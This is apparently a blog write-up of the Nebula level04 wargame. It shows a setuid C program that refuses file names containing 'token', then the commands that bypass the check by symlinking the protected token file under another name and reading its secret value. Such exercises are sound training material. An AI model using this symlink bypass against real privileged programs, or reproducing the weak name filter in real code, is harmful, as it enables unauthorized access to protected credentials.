+++
author = "pwntester"
categories = ["nebula04"]
date = 2013-11-21T00:01:00Z
description = ""
draft = false
slug = "nebula-level04-write-up"
tags = ["nebula04"]
title = "Nebula level04 write-up"

+++

In [Level04](http://exploit-exercises.com/nebula/level04) we are given the code of a program owned by flag04 user:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
    printf("%s [file to read]\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
    err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
    err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

The program opens a file passed as first argument if the name does not contain the **token** string so we cannot use it to open our target **token** file ... or can we?
Turns out that solving the level was as easy as creating symlink with a different name:

```lang-bash line-numbers 
level04@nebula:~$ /home/flag04/flag04 /home/flag04/token
You may not access '/home/flag04/token'
level04@nebula:~$ ln -s /home/flag04/token nekot
level04@nebula:~$ /home/flag04/flag04 nekot
06508b5e-8909-4f38-b630-fdb148a848a2
```
